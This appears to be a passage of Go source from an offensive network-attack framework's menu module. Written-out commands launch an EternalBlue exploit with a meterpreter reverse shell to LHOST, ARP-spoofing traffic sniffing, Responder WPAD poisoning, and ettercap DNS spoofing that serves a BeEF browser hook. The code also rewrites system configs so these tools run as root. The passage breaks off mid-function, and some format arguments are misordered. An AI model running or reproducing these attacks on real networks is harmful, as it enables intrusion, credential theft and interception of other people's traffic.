//John 3:16

package networks

import(
    "os"
    "fmt"
    "time"
    "utils"
    "menus"
    "banners"
    "strings"
    "os/exec"
    "bcolors"
    "strconv"
    "subprocess"
    "scriptures"
    "path/filepath"
)

var(
    Function string
)

var defaultValues = map[string]string{

    "proxies":          "",
    "fakedns":          "*",
    "function":         "",
    "lport":            "9999",
    "iface":            "eth0",
    "mode":             "single",
    "passwd":           "Jesus Christ",
    "utils.Spoofer":    "ettercap",

    "lhost":    utils.LHost,
    "rhost":    utils.RHost,
    "rhosts":   utils.RHost,
    "target":   utils.RHost,
    "targets":  utils.RHost,
    "gateway":  utils.Gateway,
    "output":   utils.OutPutDir,
}

type stringMatcher struct {
    names  []string
    action func()
}

func NetworksPentest() {
    for {
        fmt.Printf("%s%s%safr%s%s networks(%s%ssrc/pentest_%s.fn%s)%s > %s", bcolors.Endc, bcolors.Underl, bcolors.Bold, subprocess.Version, bcolors.Endc, bcolors.Bold, bcolors.BrightRed, Function, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        utils.Scanner.Scan()
        Input := strings.TrimSpace(utils.Scanner.Text())
        buildParts := strings.Fields(strings.ToLower(Input))
        if len(buildParts) == 0 {
            continue
        }

        if executeCommand(Input) {
            continue
        }

        switch buildParts[0] {
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "set":
            handleSetCommand(buildParts)
        case "unset", "delete":
            handleUnsetCommand(buildParts)
        case "run", "start", "launch", "exploit", "execute":
            executeFunction()
        default:
            utils.SystemShell(Input)
        }
    }
}

func executeCommand(cmd string) bool {
    commandGroups := []stringMatcher{
        {[]string{"? info", "h info", "help info"}, menus.HelpInfo},
        {[]string{"v", "version"}, banners.Version},
        {[]string{"s", "sleep"}, utils.Sleep},
        {[]string{"c", "cls", "clear", "cls screen", "clear screen", "screen cls", "screen clear"}, utils.ClearScreen},

        {[]string{"histo", "history", "show history", "log", "logs", "show log", "show logs"}, subprocess.ShowHistory},
        {[]string{"c junk", "c junks", "c output", "c outputs", "clear junk", "clear junks", "clear output", "clear outputs"}, utils.ClearJunks},
        {[]string{"c log", "c logs", "c history", "c histories", "clear log", "clear logs", "clear history", "clear histories"}, subprocess.ClearHistory},
        {[]string{"junk", "junks", "output", "outputs", "show junk", "show junks", "show output", "show outputs", "l junk", "l junks", "l output", "l outputs", "list junk", "list junks", "list output", "list outputs"}, utils.ListJunks},

        {[]string{"? run", "h run", "info run", "help run", "? exec", "h exec", "info exec", "help exec", "? launch", "h launch", "info launch", "help launch", "? exploit", "h exploit", "info exploit", "help exploit", "? execute", "h execute", "info execute", "help execute"}, menus.HelpInfoRun},

        {[]string{"set", "h set", "info set", "help set"}, menus.HelpInfoSet},
        {[]string{"use", "? use", "h use", "info use", "help use"}, menus.HelpInfoUse},

        {[]string{"tips", "h tips", "? tips", "info tips", "help tips"}, menus.HelpInfoTips},
        {[]string{"show", "? show", "h show", "info show", "help show"}, menus.HelpInfoShow},
        {[]string{"info list", "help list", "use list", "list"}, menus.HelpInfoList},
        {[]string{"h option", "? option", "h options", "? options", "info option", "help option", "info options", "help options"}, menus.HelpInfOptions},
        {[]string{"banner"}, banners.RandomBanners},
        {[]string{"g", "t", "guide", "tutarial"}, utils.BrowseTutarilas},
        {[]string{"h", "?", "00", "help"}, menus.HelpInfoMenuZero},
        {[]string{"f", "use f", "features", "use features"}, menus.HelpInfoFeatures},

        {[]string{"info"}, menus.HelpInfoNetworks},
        {[]string{"m", "menu"}, menus.MenuThree},
        {[]string{"option", "options", "show option", "show options"}, func() {menus.NetworksOptions(utils.NeMode, utils.IFace, utils.RHost, utils.BeefPass, utils.LHost, utils.Gateway, utils.Spoofer, utils.Proxies, utils.FakeDns, Function)}},

        {[]string{"func", "funcs", "functions", "show func", "list funcs", "show funcs", "show function", "list function", "list functions", "show functions", "module", "modules", "list module", "show module", "list modules", "show modules", "show all", "list all"}, menus.ListInternalFunctions},

        {[]string{"1", "run 1", "use 1", "exec 1", "start 1", "launch 1", "exploit 1", "execute 1", "run discover", "use discover", "exec discover", "start discover", "launch discover", "exploit discover", "execute discover"}, func() {NetworkPenFunctions("discover")}},
        {[]string{"? 1", "info 1", "help 1", "discover", "info discover", "help discover"}, menus.HelpInfoDiscover},

        {[]string{"2", "run 2", "use 2", "exec 2", "start 2", "launch 2", "exploit 2", "execute 2", "run portscan", "use portscan", "exec portscan", "start portscan", "launch portscan", "exploit portscan", "execute portscan"}, func() {NetworkPenFunctions("portscan")}},
        {[]string{"? 2", "info 2", "help 2", "portscan", "info portscan", "help portscan"}, menus.HelpInfoInPortScan},

        {[]string{"3", "run 3", "use 3", "exec 3", "start 3", "launch 3", "exploit 3", "execute 3", "run vulnscan", "use vulnscan", "exec vulnscan", "start vulnscan", "launch vulnscan", "exploit vulnscan", "execute vulnscan"}, func() {NetworkPenFunctions("vulnscan")}},
        {[]string{"? 3", "info 3", "help 3", "vulnscan", "info vulnscan", "help vulnscan"}, menus.HelpInfoInVulnScan},

        {[]string{"4", "run 4", "use 4", "exec 4", "start 4", "launch 4", "exploit 4", "execute 4", "run enumscan", "use enumscan", "exec enumscan", "start enumscan", "launch enumscan", "exploit enumscan", "execute enumscan"}, func() {NetworkPenFunctions("enumscan")}},
        {[]string{"? 4", "info 4", "help 4", "enumscan", "info enumscan", "help enumscan"}, menus.HelpInfoInEnumScan},

        {[]string{"5", "run 5", "use 5", "exec 5", "start 5", "launch 5", "exploit 5", "execute 5", "run smbexplo", "use smbexplo", "exec smbexplo", "start smbexplo", "launch smbexplo", "exploit smbexplo", "execute smbexplo"}, func() {NetworkPenFunctions("smbexplo")}},
        {[]string{"? 5", "info 5", "help 5", "smbexplo", "info smbexplo", "help smbexplo"}, menus.HelpInfoSmbExplo},

        {[]string{"6", "run 6", "use 6", "exec 6", "start 6", "launch 6", "exploit 6", "execute 6", "run psniffer", "use psniffer", "exec psniffer", "start psniffer", "launch psniffer", "exploit psniffer", "execute psniffer"}, func() {NetworkPenFunctions("psniffer")}},
        {[]string{"? 6", "info 6", "help 6", "psniffer", "info psniffer", "help psniffer"}, menus.HelpInfoPSniffer},

        {[]string{"7", "run 7", "use 7", "exec 7", "start 7", "launch 7", "exploit 7", "execute 7", "run responda", "use responda", "exec responda", "start responda", "launch responda", "exploit responda", "execute responda"}, func() {NetworkPenFunctions("responda")}},
        {[]string{"? 7", "info 7", "help 7", "responda", "info responda", "help responda"}, func() {menus.HelpInfoResponder(utils.NeMode, utils.LPort, utils.RHost, utils.LHost)}},

        {[]string{"8", "run 8", "use 8", "exec 8", "start 8", "launch 8", "exploit 8", "execute 8", "run beefkill", "use beefkill", "exec beefkill", "start beefkill", "launch beefkill", "exploit beefkill", "execute beefkill"}, func() {NetworkPenFunctions("beefkill")}},
        {[]string{"? 8", "info 8", "help 8", "beefkill", "info beefkill", "help beefkill"}, func() {menus.HelpInfoBeefKill(utils.NeMode, utils.LPort, utils.Spoofer, utils.RHost, utils.LHost)}},

        {[]string{"9", "run 9", "use 9", "exec 9", "start 9", "launch 9", "exploit 9", "execute 9", "run toxssinx", "use toxssinx", "exec toxssinx", "start toxssinx", "launch toxssinx", "exploit toxssinx", "execute toxssinx"}, func() {NetworkPenFunctions("toxssinx")}},
        {[]string{"? 9", "info 9", "help 9", "toxssinx", "info toxssinx", "help toxssinx"}, func() {menus.HelpInfoToxssInx(utils.NeMode, utils.LPort, utils.Spoofer, utils.RHost, utils.LHost)}},

        {[]string{"10", "run 10", "use 10", "exec 10", "start 10", "launch 10", "exploit 10", "execute 10", "run verses", "use verses", "exec verses", "start verses", "launch verses", "exploit verses", "execute verses"}, scriptures.ScriptureNarators},
        {[]string{"? 10", "verses", "info 10", "help 10", "info verses", "help verses"}, menus.HelpInfoVerses},
    }

    cmdLower := strings.ToLower(cmd)
    for _, group := range commandGroups {
        for _, name := range group.names {
            if name == cmdLower {
                group.action()
                return true
            }
        }
    }
    return false
}

func handleSetCommand(parts []string) {
    if len(parts) < 3 {
        menus.HelpInfoSet()
        return
    }
    key, value := parts[1], parts[2]
    setValues := map[string]*string{

        "func": &Function,
        "funcs": &Function,
        "module": &Function,
        "function": &Function,
        "functions": &Function,
        "mode": &utils.NeMode,
        "lhost": &utils.LHost,
        "lport": &utils.LPort,
        "iface": &utils.IFace,
        "rhost": &utils.RHost,
        "rhosts": &utils.RHost,
        "target": &utils.RHost,
        "targets": &utils.RHost,
        "proxies": &utils.Proxies,
        "passwd": &utils.BeefPass,
        "gateway": &utils.Gateway,
        "fakedns": &utils.FakeDns,
        "spoofer": &utils.Spoofer,
    }

    validKeys := make([]string, 0, len(setValues))
    for k := range setValues {
        validKeys = append(validKeys, k)
    }

    if ptr, exists := setValues[key]; exists {
        *ptr = value
        fmt.Printf("%s%s%s -> %s\n", bcolors.Cyan, strings.ToUpper(key), bcolors.Endc, value)
        return
    }

    var suggestions []string
    lowerInput := strings.ToLower(key)
    for _, cmd := range validKeys {
        lowerCmd := strings.ToLower(cmd)
        if strings.HasPrefix(lowerCmd, lowerInput) || strings.Contains(lowerCmd, lowerInput) || utils.Levenshtein(lowerInput, lowerCmd) <= 2 {
            suggestions = append(suggestions, cmd)
        }
    }

    if len(suggestions) > 0 {
        fmt.Printf("%s[!] %sKey '%s%s%s' is invalid. Did you mean one of these?%s\n\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, key, bcolors.Endc, bcolors.Endc)

        maxWidth := 0
        for _, s := range suggestions {
            if len(s) > maxWidth {
                maxWidth = len(s)
            }
        }
        maxWidth += 3

        cols := 5
        if len(suggestions) < cols {
            cols = len(suggestions)
        }

        for i := 0; i < len(suggestions); i += cols {
            for j := 0; j < cols && i+j < len(suggestions); j++ {
                fmt.Printf(" - %s%-*s%s", bcolors.Green, maxWidth, suggestions[i+j], bcolors.Endc)
            }
            fmt.Println()
        }

        return
    }

    fmt.Printf("%s[!] %sKey '%s%s%s' is invalid. Available keys:%s\n\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, key, bcolors.Endc, bcolors.Endc)
    maxWidth := 0
    for _, k := range validKeys {
        if len(k) > maxWidth {
            maxWidth = len(k)
        }
    }
    maxWidth += 3

    cols := 5
    for i := 0; i < len(validKeys); i += cols {
        for j := 0; j < cols && i+j < len(validKeys); j++ {
            fmt.Printf(" - %s%-*s%s", bcolors.Green, maxWidth, validKeys[i+j], bcolors.Endc)
        }
        fmt.Println()
    }
}

func handleUnsetCommand(parts []string) {
    if len(parts) < 2 {
        menus.HelpInfoSet()
        return
    }
    key := parts[1]
    unsetValues := map[string]*string{

        "func": &Function,
        "funcs": &Function,
        "module": &Function,
        "function": &Function,
        "functions": &Function,
        "mode": &utils.NeMode,
        "lhost": &utils.LHost,
        "lport": &utils.LPort,
        "iface": &utils.IFace,
        "rhost": &utils.RHost,
        "rhosts": &utils.RHost,
        "target": &utils.RHost,
        "targets": &utils.RHost,
        "proxies": &utils.Proxies,
        "passwd": &utils.BeefPass,
        "gateway": &utils.Gateway,
        "fakedns": &utils.FakeDns,
        "spoofer": &utils.Spoofer,
    }

    defaultValues := map[string]string{
        "mode":         "",
        "lhost":        "",
        "lport":        "",
        "iface":        "",
        "rhost":        "",
        "rhosts":       "",
        "target":       "",
        "targets":      "",
        "proxies":      "",
        "passwd":       "",
        "func":         "",
        "funcs":        "",
        "gateway":      "",
        "fakedns":      "",
        "spoofer":      "",
        "module":       "",
        "function":     "",
        "functions":    "",
    }

    validKeys := make([]string, 0, len(unsetValues))
    for k := range unsetValues {
        validKeys = append(validKeys, k)
    }

    if ptr, exists := unsetValues[key]; exists {
        *ptr = defaultValues[key]
        fmt.Printf("%s -> %s\n", strings.ToUpper(key), "Null")
        return
    }

    var suggestions []string
    lowerInput := strings.ToLower(key)
    for _, cmd := range validKeys {
        lowerCmd := strings.ToLower(cmd)
        if strings.HasPrefix(lowerCmd, lowerInput) || strings.Contains(lowerCmd, lowerInput) || utils.Levenshtein(lowerInput, lowerCmd) <= 2 {
            suggestions = append(suggestions, cmd)
        }
    }

    if len(suggestions) > 0 {
        fmt.Printf("%s[!] %sKey '%s%s%s' is invalid. Did you mean one of these?%s\n\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, key, bcolors.Endc, bcolors.Endc)

        maxWidth := 0
        for _, s := range suggestions {
            if len(s) > maxWidth {
                maxWidth = len(s)
            }
        }
        maxWidth += 3

        cols := 5
        if len(suggestions) < cols {
            cols = len(suggestions)
        }
        
        for i := 0; i < len(suggestions); i += cols {
            for j := 0; j < cols && i+j < len(suggestions); j++ {
                fmt.Printf(" - %s%-*s%s", bcolors.Green, maxWidth, suggestions[i+j], bcolors.Endc)
            }
            fmt.Println()
        }

        return
    }

    fmt.Printf("%s[!] %sKey '%s%s%s' is invalid. Available keys:%s\n\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, key, bcolors.Endc, bcolors.Endc)

    maxWidth := 0
    for _, k := range validKeys {
        if len(k) > maxWidth {
            maxWidth = len(k)
        }
    }
    maxWidth += 3

    cols := 5
    for i := 0; i < len(validKeys); i += cols {
        for j := 0; j < cols && i+j < len(validKeys); j++ {
            fmt.Printf(" - %s%-*s%s", bcolors.Green, maxWidth, validKeys[i+j], bcolors.Endc)
        }
        fmt.Println()
    }
}

func executeFunction() {
    if Function == ""{
        fmt.Printf("\n%s[!] %sNo MODULE was set. Use %s'show modules' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    NetworkPenFunctions(Function, utils.IFace, utils.Gateway, utils.LHost, utils.RHost, utils.NeMode, utils.FakeDns, utils.Spoofer)
}

func NetworkPenFunctions(Function string, args ...interface{}) {
    os.MkdirAll(utils.NetworkLogs, os.ModePerm)

    if utils.Proxies != "" {
        menus.PrintSelected(menus.PrintOptions{
            MODE: utils.NeMode,
            IFACE: utils.IFace,
            LPORT: utils.LPort,
            HPORT: utils.HPort,
            RHOST: utils.RHost,
            LHOST: utils.LHost,
            //DISTRO: utils.Distro,
            //SCRIPT: utils.Script,
            OUTPUTLOGS: utils.NetworkLogs,
            PROXIES: utils.Proxies,
            FUNCTION: Function,
            //RECONDIR: utils.ReconDir,
            //LISTENER: utils.Listener,
            PROTOCOL: utils.Protocol,
            //TOOLSDIR: utils.ToolsDir,
            //INNERICON: utils.InnerIcon,
            //OUTERICON: utils.OuterIcon,
            //BUILDNAME: utils.BuildName,
            //OBFUSCATOR: utils.Obfuscator,
        }, true, false)

        if err := utils.SetProxy(utils.Proxies); err != nil {
            //
        }
    } else {
        menus.PrintSelected(menus.PrintOptions{
            MODE: utils.NeMode,
            IFACE: utils.IFace,
            LPORT: utils.LPort,
            HPORT: utils.HPort,
            RHOST: utils.RHost,
            LHOST: utils.LHost,
            //DISTRO: utils.Distro,
            //SCRIPT: utils.Script,
            OUTPUTLOGS: utils.NetworkLogs,
            FUNCTION:    Function,
            //RECONDIR: utils.ReconDir,
            //LISTENER: utils.Listener,
            PROTOCOL: utils.Protocol,
            //TOOLSDIR: utils.ToolsDir,
            //INNERICON: utils.InnerIcon,
            //OUTERICON: utils.OuterIcon,
            //BUILDNAME: utils.BuildName,
            //OBFUSCATOR: utils.Obfuscator,
        }, true, false)
    }

    commands := map[string]func(){
        "discover": func() {DiscoverIps()},
        "portscan": func() {NmapPortScan(utils.RHost)},
        "vulnscan": func() {NmapVulnScan(utils.RHost)},
        "enumscan": func() {SmbVulnScan(utils.RHost); EnumNxc(utils.RHost); Enum4linux(utils.RHost); SmbMapScan(utils.RHost)},
        "smbexplo": func() {SmbVulnScan(utils.RHost); SmbExploit(utils.RHost, utils.LHost, utils.LPort)},
        "psniffer": func() {PacketSniffer(utils.NeMode, utils.RHost)},
        "responda": func() {KillerResponder(utils.IFace, utils.LHost)},
        "beefkill": func() {BeefKill(utils.Spoofer, utils.NeMode, utils.LHost, utils.RHost, utils.IFace, utils.BeefPass, utils.FakeDns, utils.Gateway)},
        "toxssinx": func() {ToxssInx(utils.RHost)},

        "1": func() {DiscoverIps()},
        "2": func() {NmapPortScan(utils.RHost)},
        "3": func() {NmapVulnScan(utils.RHost)},
        "4": func() {SmbVulnScan(utils.RHost); EnumNxc(utils.RHost); Enum4linux(utils.RHost); SmbMapScan(utils.RHost)},
        "5": func() {SmbVulnScan(utils.RHost); SmbExploit(utils.RHost, utils.LHost, utils.LPort)},
        "6": func() {PacketSniffer(utils.NeMode, utils.RHost)},
        "7": func() {KillerResponder(utils.IFace, utils.LHost)},
        "8": func() {BeefKill(utils.Spoofer, utils.NeMode, utils.LHost, utils.RHost, utils.IFace, utils.BeefPass, utils.FakeDns, utils.Gateway)},
        "9": func() {ToxssInx(utils.RHost)},
    }

    textCommands := []string{"discover", "portscan", "vulnscan", "enumscan", "smbexplo", "psniffer", "responda", "beefkill", "toxssinx"}

    if action, exists := commands[Function]; exists {
        action()
        return
    }

    if num, err := strconv.Atoi(Function); err == nil {
        fmt.Printf("\n%s[!] %sNumber %d is invalid. Valid numbers are from 1-10.\n", bcolors.Yellow, bcolors.Endc, num)
        menus.ListInternalFunctions()
        return
    }

    lowerInput := strings.ToLower(Function)
    for _, cmd := range textCommands {
        lowerCmd := strings.ToLower(cmd)
        if strings.HasPrefix(lowerCmd, lowerInput) || strings.Contains(lowerCmd, lowerInput) || utils.Levenshtein(lowerInput, lowerCmd) <= 2 {
            fmt.Printf("\n%s[!] %sFunction '%s%s%s' is invalid. Did you mean %s'%s'%s?\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, Function, bcolors.Endc, bcolors.Green, cmd, bcolors.Endc)
            return
        }
    }

    fmt.Printf("\n%s[!] %sModule '%s' is invalid. Available commands:\n", bcolors.Yellow, bcolors.Endc, Function)
    menus.ListInternalFunctions()
}

func IpNeighbour() {
    fmt.Printf("\n%s[>] %sDiscovering connected devices ...\n", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`ip -h -s -d -a -c=auto -t neighbour`)
    return
}

func DiscoverIps() {
    fmt.Printf("\n%s[>] %sDiscovering connected devices ...\n", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.ready) » {reset}; net.recon on; net.probe on; set net.scan on; net.show; active"`)
    return
}

func NaabuPortScan(RHost string) {
    if utils.RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[>] %sport scan target: %s...\n", bcolors.Green, bcolors.Endc, utils.RHost)
    subprocess.Popen(`naabu -host %s`, utils.RHost)
    return
}

func NmapPortScan(RHost string) {
    if utils.RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[>] %sport scan target: %s...\n", bcolors.Green, bcolors.Endc, utils.RHost)
    subprocess.Popen(`nmap -sV -sC -O -T4 -n -v -p- %s`, utils.RHost)
    return
}

func NmapVulnScan(RHost string) {
    if utils.RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[>] %svuln scan target: %s...\n", bcolors.Green, bcolors.Endc, utils.RHost)
    subprocess.Popen(`nmap --open -v -T4 -n -sSV -p- --script="vuln and safe" --reason %s`, utils.RHost)
    return
}

func SmbVulnScan(RHost string) {
    if utils.RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[>] %sSMB vuln scan target: %s...\n", bcolors.Green, bcolors.Endc, utils.RHost)
    subprocess.Popen(`nmap -sV -v --script "smb-vuln*" -p139,445 %s`, utils.RHost)
    return
}

func Enum4linux(RHost string) {
    if utils.RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[>] %srunning smb recon on target: %s...\n", bcolors.Green, bcolors.Endc, utils.RHost)
    subprocess.Popen(`cd %s/networks/enum4linux-ng; python3 enum4linux-ng.py -A -v %s`, utils.RHost, utils.ToolsDir)
    return
}

func EnumNxc(RHost string) {
    if utils.RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[>] %srunning smb recon on target: %s...\n", bcolors.Green, bcolors.Endc, utils.RHost)
    subprocess.Popen(`nxc smb %s -u '' -p '' --verbose --groups --local-groups --loggedon-s --rid-brute --sessions --s --shares --pass-pol`, utils.RHost)
    return
}

func SmbMapScan(RHost string) {
    if utils.RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[>] %srunning smb recon on target: %s...\n", bcolors.Green, bcolors.Endc, utils.RHost)
    subprocess.Popen(`smbmap -u '' -p '' -r --depth 5 -H %s; smbmap --no-banner -u 'guest' -p '' -r --depth 5 -H %s`, utils.RHost, utils.RHost)
    return
}

func RpcEnumScan(RHost string) {
    if utils.RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[>] %sperforming rpc recon target: %s...\n", bcolors.Green, bcolors.Endc, utils.RHost)
    subprocess.Popen(`rpcclient -U "" -N %s`, utils.RHost)
    return
}

func ToxssInx(RHost string) {
    fmt.Printf("\n%s[>] %sperforming M.I.B attacks: %s...\n", bcolors.Green, bcolors.Endc, utils.RHost)
    subprocess.Popen(`cd %s/networks/toxssin/; python3 toxssin.py -u https://%s -c %s -k %s -p %s -v`, utils.ToolsDir, utils.LHost, utils.CertPath, utils.KeyPath, "443")
    return
}

func SmbExploit(RHost, LHost, LPort string) {
    if utils.RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[>] %sexploiting smb on target: %s...\n", bcolors.Green, bcolors.Endc, utils.RHost)
    subprocess.Popen(`msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set VERBOSE true; exploit -j'`, utils.RHost, utils.LHost, utils.LPort)
}

func PacketSniffer(NeMode, RHost string) {
    if _, err := exec.LookPath("bettercap"); err != nil {
        fmt.Printf("\n%s[!] %sBettercap isn't installed, install it with %s'sudo apt install responder.'%s\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    if utils.RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    switch strings.ToLower(utils.NeMode) {
    case "single":
        subprocess.Popen(`bettercap -caplet %s/networks/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active'`, utils.ToolsDir, utils.RHost)
    case "all":
        subprocess.Popen(`bettercap -caplet %s/networks/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active'`, utils.ToolsDir)
    default:
        fmt.Printf("\n%s[!] %sInvalid required parameters MODE: %s%s%s Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightRed, utils.NeMode, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
}

func KillerResponder(IFace, LHost string) {
    filePath :=  filepath.Join(utils.ToolsDir, "/networks/responder/Responder.conf.bak_africana")
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        subprocess.Popen("cp %s/networks/responder/Responder.conf %s/networks/responder/Responder.conf.bak_africana", utils.ToolsDir, utils.ToolsDir)
        newString  := fmt.Sprintf(`WPADScript = function FindProxyForURL(url, host)[if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY %s:3128; PROXY %s:3141; DIRECT';]'`, utils.LHost, utils.LHost)

        filesToReplacements := map[string]map[string]string{
            filepath.Join(utils.ToolsDir, "/networks/responder/Responder.conf"): {
            "WPADScript =": newString,
            },
        }

        utils.Editors(filesToReplacements)

        subprocess.Popen(`cd %s/networks/responder/; python3 Responder.py -I %s -Pdv`, utils.ToolsDir, utils.IFace)
        subprocess.Popen(`rm -rf %s/networks/responder/Responder.conf; mv %s/networks/responder/Responder.conf.bak_africana %s/networks/responder/Responder.conf`, utils.ToolsDir, utils.ToolsDir, utils.ToolsDir)

    } else {
        subprocess.Popen("cd %s/networks/responder/; python3 Responder.py -I %s -Pdv", utils.ToolsDir, utils.IFace)
        subprocess.Popen("rm -rf %s/networks/responder/Responder.conf; mv %s/networks/responder/Responder.conf.bak_africana %s/networks/responder/Responder.conf", utils.ToolsDir, utils.ToolsDir, utils.ToolsDir)
    }
}

func BeefEttercap(NeMode, LHost, RHost, IFace, BeefPasswd, FakeDns, Gateway string) {
    if utils.RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    switch strings.ToLower(utils.NeMode) {
    case "single":
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)

            newString := fmt.Sprintf(`passwd: "%s"`,utils.BeefPass)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `=beef-xss`: `=root`,
                    },
                }
            utils.Editors(filesToReplacements)

            }
            subprocess.Popen(`systemctl daemon-reload`)

            }

            filePathO := "/etc/ettercap/etter.conf.bak_africana"
            if _, err := os.Stat(filePathO); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/etc/ettercap/etter.conf": {
                        `ec_uid = 65534`: `ec_uid = 0`,
                        `ec_gid = 65534`: `ec_gid = 0`,
                        `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                        `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                        `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                        `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            filePathT := "/etc/ettercap/etter.dns.bak_africana"
            if _, err := os.Stat(filePathT); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n%s%s%s", utils.FakeDns, " A ", utils.LHost)
                filesToReplacements := map[string]map[string]string{
                    "/etc/ettercap/etter.dns": {
                        `# vim:ts=8:noexpandtab`: newString,
                     },
                }
            utils.Editors(filesToReplacements)
            }

            fileXPath := "/var/www/html/.Files"
            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/africana-base/networks/beefhook/* /var/www/html/`)
